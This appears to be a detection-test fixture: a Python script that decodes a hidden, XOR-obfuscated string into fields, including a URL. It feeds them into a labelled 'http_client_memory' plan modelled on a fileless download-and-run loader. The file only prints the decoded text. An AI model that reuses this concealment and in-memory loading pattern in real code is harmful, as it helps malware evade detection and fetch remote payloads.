# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_40f4b1e9 = "m6aU6JvvivqJtNW2x7LbqcyT4YTphvKXu9-2xbXUoMOr9Jn8kf6M9YnojO2d6Yz-w6vfq9uE54vih-mdwq_Kp8i6w7_MuNm-24TniP2T59rrl-Sd84fmnqPGvt24yLzVutSL7pbmlPGC8Zj3meWK6I77iOuK_pf4lqvGp9Wmzq_DnPmX4YToh_eSzb3RsN6iwaDSoMms3uOT6ov5lPuJ1rnbvci72LnNqMywx67ApMu8z5Dzm_qT_cC3xKfVvMy455P8o9Oq3rbZt8uoyaTUtdy71Yrjh7rZuNWlxK3KpIntiO7Wt9Tj07DWqt-twfyU4JTkl62CrcmsyvKT8Mf3lPLcucGgzb3RtJrzneuK5o_rxKGR9JD2wKGYtsa_w7bFoNKN7IvugPTJgfSa7pz5ivmp0KTMo83ihuOFvdy_iLjbvQ=="
CODEC_40f4b1e9 = "urlsafe_base64|rolling_xor|ed"

def load_40f4b1e9():
    return base64.urlsafe_b64decode(MATERIAL_40f4b1e9)

def decode_40f4b1e9(e):
    d = bytearray()
    q = 237
    for value in e:
        d.append(value ^ q)
        q = value
    return bytes(d)

def recover_40f4b1e9():
    n = 19 * 7 - 133
    _pass = 0
    while _pass < 1:
        d = decode_40f4b1e9(load_40f4b1e9())
        _pass += 1
    t = d.decode("ascii", "strict")
    return t

def inspect_40f4b1e9():
    view = memoryview(recover_40f4b1e9().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_40f4b1e9():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_40f4b1e9():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_40f4b1e9():
    fields = dict(item.split("=", 1) for item in inspect_40f4b1e9().split("|"))
    analysis_surface = surface_40f4b1e9()
    obfuscation_surface = obfuscation_40f4b1e9()
    operation_plan = ("http_client_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_40f4b1e9())

# reconstruction complete